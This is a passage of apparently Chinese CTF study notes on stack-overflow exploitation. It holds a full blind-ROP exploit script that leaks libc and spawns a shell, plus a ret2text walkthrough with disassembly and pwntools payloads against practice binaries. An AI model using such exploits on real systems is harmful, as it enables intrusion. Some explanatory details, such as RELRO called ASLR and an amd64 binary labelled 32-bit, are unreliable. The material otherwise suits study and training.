find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;\nWelCome&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>完整EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbufferflow_length</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">            sh.send(i * <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&#x27;No password&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="built_in">print</span> content</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;one success stop gadget addr: 0x%x&#x27;</span> % (addr)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_gadget</span>(<span class="params">csu_last, csu_middle, saved_addr, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = p64(csu_last)  <span class="comment"># pop rbx,rbp,r12,r13,r14,r15, ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)  <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)  <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(saved_addr)  <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)  <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(csu_middle)  <span class="comment"># will call [rbx + r12 * 0x8]</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span>  <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">&#x27;WelCome&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)        </span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop_gadget</span>(<span class="params">length, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400740</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">            <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leakfunction</span>(<span class="params">length, rdi_ret, puts_plt, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">#stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">#brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line"><span class="comment">#puts_plt = 0x400560</span></span><br><span class="line"><span class="comment">#leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;\nWelCome&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://blog.csdn.net/qq_41202237/article/details/105913705">好好说话之re2reg_ret2reg_hollk的博客-CSDN博客</a></p></li><li><p><a href="https://www.yuque.com/hxfqg9/bin/pqc1nq#ddWyh">Intermediate ROP (yuque.com)</a></p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#gadget">中级ROP - CTF Wiki (ctf-wiki.org)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Overflow - 基本ROP</title>
      <link href="/article/6f59.html"/>
      <url>/article/6f59.html</url>
      
        <content type="html"><![CDATA[<h1 id="Stack-Overflow-基本ROP"><a href="#Stack-Overflow-基本ROP" class="headerlink" title="Stack Overflow - 基本ROP"></a>Stack Overflow - 基本ROP</h1><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><ul><li>NX保护（DEP）：栈上的数据没有执行权限，防止栈溢出和在栈上执行shellcode，实际上有了NX保护，堆、栈、bss段就没有执行权限了</li><li>canary保护（FS）：函数开始时会随机产生一个值，这个值canary放在紧挨EBP的位置，当攻击者想要通过缓冲区溢出覆盖EBP和EBP下面的返回地址时，就会覆盖canary的值，程序结束以后，程序会检查canary这个值和之前的是不是一致，不一致就不往下运行，能够防止所有单纯的栈溢出</li><li>RELRO保护（ASLR）：堆栈地址随机化，能够防止所有需要用到堆栈精确地址的攻击</li><li>PIE：代码地址随机化，防止构造ROP链攻击</li></ul><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p>由于NX保护的开启，直接向堆或者是栈上注入代码的方式难以继续发挥效果，可以通过ROP来绕过保护，在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>gadgets就是以ret结尾的指令序列，通过这些指令序列能够修改某些地址的内容，方便控制程序的执行流程，核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序</p><p>只要满足以下条件，那么就可以尝试进行ROP攻击：</p><ul><li>程序存在栈溢出，并且可以控制返回地址</li><li>可以找到满足条件的gadgets和相应的地址</li></ul><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>即控制程序本身已有的代码(.text)，我们需要知道对应代码的返回位置，如果有保护开启的话，需要想办法绕过</p><h3 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctfhub</p><p>先检查保护：64位，未开启任何保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>使用IDA看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400795 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:0000000000400798 48 8D 45 F8                   lea     rax, [rbp+var_8]</span><br><span class="line">.text:000000000040079C 48 89 C6                      mov     rsi, rax</span><br><span class="line">.text:000000000040079F 48 8D 3D 22 01 00 00          lea     rdi, unk_4008C8</span><br><span class="line">.text:00000000004007A6 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000004007AB E8 C0 FE FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:00000000004007AB</span><br><span class="line">.text:00000000004007B0 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:00000000004007B3 39 45 FC                      cmp     [rbp+var_4], eax</span><br><span class="line">.text:00000000004007B6 75 0C                         jnz     short loc_4007C4</span><br><span class="line">.text:00000000004007B6</span><br><span class="line">.text:00000000004007B8 48 8D 3D 0C 01 00 00          lea     rdi, command                    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004007BF E8 5C FE FF FF                call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 system(“&#x2F;bin&#x2F;sh”) 的代码，那么如果我们直接控制程序返回至 0x4007B8，那么就可以得到系统的 shell 了</p><p>接下来就要构造payload了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数</p><p>第一种办法，直接在IDA里面查看</p><p>点进v4里面，s就是ebp，r就是返回地址，v4就是var_70，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000070 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000070 ; N       : rename</span><br><span class="line">-0000000000000070 ; U       : undefine</span><br><span class="line">-0000000000000070 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000070 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000070 ; Frame size: 70; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000070 ;</span><br><span class="line">-0000000000000070</span><br><span class="line">-0000000000000070 var_70 db 112 dup(?)</span><br><span class="line">+0000000000000000  s db 8 dup(?)</span><br><span class="line">+0000000000000008  r db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><p>第二种办法：</p><p>IDA中找到get函数地址后，在GDB中查看反汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disass 0x400823</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004007c7 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00000000004007c8 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">=&gt; 0x00000000004007cb &lt;+4&gt;:sub    rsp,0x70</span><br><span class="line">   0x00000000004007cf &lt;+8&gt;:mov    rax,QWORD PTR [rip+0x20089a]        # 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">   0x00000000004007d6 &lt;+15&gt;:mov    ecx,0x0</span><br><span class="line">   0x00000000004007db &lt;+20&gt;:mov    edx,0x2</span><br><span class="line">   0x00000000004007e0 &lt;+25&gt;:mov    esi,0x0</span><br><span class="line">   0x00000000004007e5 &lt;+30&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000004007e8 &lt;+33&gt;:call   0x400660 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x00000000004007ed &lt;+38&gt;:mov    rax,QWORD PTR [rip+0x20088c]        # 0x601080 &lt;stdin@@GLIBC_2.2.5&gt;</span><br><span class="line">   0x00000000004007f4 &lt;+45&gt;:mov    ecx,0x0</span><br><span class="line">   0x00000000004007f9 &lt;+50&gt;:mov    edx,0x1</span><br><span class="line">   0x00000000004007fe &lt;+55&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000400803 &lt;+60&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000400806 &lt;+63&gt;:call   0x400660 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x000000000040080b &lt;+68&gt;:lea    rdi,[rip+0xc6]        # 0x4008d8</span><br><span class="line">   0x0000000000400812 &lt;+75&gt;:call   0x400610 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400817 &lt;+80&gt;:lea    rax,[rbp-0x70]</span><br><span class="line">   0x000000000040081b &lt;+84&gt;:mov    rdi,rax</span><br><span class="line">   0x000000000040081e &lt;+87&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400823 &lt;+92&gt;:call   0x400650 &lt;gets@plt&gt;</span><br><span class="line">   0x0000000000400828 &lt;+97&gt;:lea    rdi,[rip+0xd4]        # 0x400903</span><br><span class="line">   0x000000000040082f &lt;+104&gt;:call   0x400610 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400834 &lt;+109&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400839 &lt;+114&gt;:leave  </span><br><span class="line">   0x000000000040083a &lt;+115&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>查看变量的位置，为 <code>[rbp-0x70]</code>。由于是64位系统，要覆盖掉ebp，就要+8字节。因此 字符串长度为 <code>0x70 + 8</code></p><p>写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="comment"># p = remote()</span></span><br><span class="line"><span class="comment">#远程交互</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#运行这个程序并获得和这个程序进行交互的接口</span></span><br><span class="line">secure = <span class="number">0x4007B8</span></span><br><span class="line"><span class="comment">#/bin/sh地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span>  + p64(secure)</span><br><span class="line"><span class="comment">#填满缓冲区，并把返回地址修改成secure的地址</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:\n&quot;</span>)</span><br><span class="line"><span class="comment">#让程序运行到“Welcome to CTFHub ret2text.Input someting:\n”这句话停下来</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送攻击数据</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#通过shell进行交互</span></span><br></pre></td></tr></table></figure><h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><p><strong>题目来源：ctfhub</strong></p><ul><li>首先检查保护措施：</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843520.png" alt="image-20230513191804823"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:    amd64-64-little //文件为32位程序</span><br><span class="line"></span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line"></span><br><span class="line">Stack:    No canary found    //未开启canary保护</span><br><span class="line"></span><br><span class="line">NX:      NX disabled    //未开启栈不可执行保护</span><br><span class="line"></span><br><span class="line">PIE:      No PIE (0x8048000)    //未开启地址无关可执行</span><br><span class="line"></span><br><span class="line">RWX:      Has RWX segments     </span><br></pre></td></tr></table></figure><ol><li><p>首先是stack保护措施，如果开启的话在栈中返回地址前放一个随机值，如果被覆盖，程序就会报错退出</p></li><li><p>nx则是 no execution，如果开启的话就不能让ip寄存器指向堆和栈，注意堆和栈是不同的东西</p></li><li><p>64-bit dynamically linked，获得基本信息之后就运行程序，分析它的功能</p></li></ol><ul><li>IDA查看</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843527.png" alt="image-20230513195452347"></p><p>看到gets函数，gets函数对输入内容的长度没有限制，可能会存在栈溢出</p><ul><li>点进v4里面，s就是ebp，r就是返回地址，v4就是var_70，所以大小为78，我们希望的就是拿到shell</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843533.png" alt="image-20230513202925299"></p><ul><li>通过找字符串或者secure函数可以看到&#x2F;bin&#x2F;sh，利用它就可以拿到shell</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843541.png" alt="image-20230513192105293"></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843543.png" alt="image-20230513192129730"></p><p>找到&#x2F;bin&#x2F;sh的地址（注意要是.text中的地址）</p><ul><li>可以用pwntools写脚本</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="comment"># p = remote()</span></span><br><span class="line"><span class="comment">#远程交互</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#运行这个程序并获得和这个程序进行交互的接口</span></span><br><span class="line">secure = <span class="number">0x4007B8</span></span><br><span class="line"><span class="comment">#/bin/sh地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span>  + p32(secure)</span><br><span class="line"><span class="comment">#填满缓冲区，并把返回地址修改成secure的地址</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:\n&quot;</span>)</span><br><span class="line"><span class="comment">#知道“”这句话停下来</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送攻击数据</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#通过shell进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>控制程序执行shellcode代码，shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p><p><strong>一般来说，shellcode 需要我们自己填充，这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong></p><p>想要执行shellcode需要shellcode所在的区域具有可执行权限，即必须是在堆栈不可执行关闭（NX关闭）的情况下才可以</p><h3 id="示例复现-1"><a href="#示例复现-1" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctf_wiki</p><p>下载好题目先check</p><figure class="highlight 